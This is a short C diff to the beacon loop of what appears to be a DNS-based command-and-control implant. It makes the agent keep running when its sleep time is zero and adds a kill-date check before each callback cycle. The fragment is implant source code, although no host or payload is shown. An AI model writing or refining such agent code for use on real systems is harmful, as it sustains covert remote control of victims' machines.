@@ -134,7 +134,11 @@ void beacon(LPVOID lpReserved) {
 	/* initialize the agent */
 	agent_init(buffer, MAX_GET);
 
-	while (sleep_time > 0) {
+	/* sleep 0 = interactive, never a loop exit (official semantics; the
+	 * old sleep_time gate safe_exit'ed the beacon on `sleep 0`). */
+	while (TRUE) {
+		if (check_kill_date())
+			safe_exit();
 		// dlog("dnsb.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n");
 
 		/* setup how we're going to beacon back... */
